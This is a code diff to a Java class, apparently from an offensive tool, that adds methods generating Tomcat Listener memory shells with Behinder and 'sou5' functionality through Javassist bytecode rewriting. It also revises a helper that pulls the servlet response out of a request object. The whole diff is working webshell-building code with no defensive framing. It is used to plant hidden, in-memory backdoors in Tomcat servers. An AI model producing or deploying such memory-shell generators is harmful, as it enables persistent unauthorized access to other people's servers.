@@ -76,12 +76,52 @@ public class MSJavaClassBuilder {
         return JavaClassModifier.toBytes(ctClass);
     }
 
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] tomcatListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        tomcatListenerResponseMaker(ctClass);
+
+        behinderMS(javaClassHelper);
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.sou5)
+    public byte[] tomcatListenerSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        tomcatListenerResponseMaker(ctClass);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
     public void tomcatListenerResponseMaker(CtClass ctClass) throws Exception {
         // response
         CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
-        responseCtMethod.setBody("{Object request = getFieldValue($1, \"request\");\n" +
-                "Object httpServletResponse = getFieldValue(request, \"response\");\n" +
-                "return httpServletResponse;}");
+        responseCtMethod.setBody("{        try {\n" +
+                "            $1 = getFieldValue($1, \"request\");\n" +
+                "        }catch (Exception e){\n" +
+                "        }\n" +
+                "        Object httpServletResponse = getFieldValue($1, \"response\");\n" +
+                "        return httpServletResponse;}");
     }
 
     @Middleware(Middleware.Tomcat)
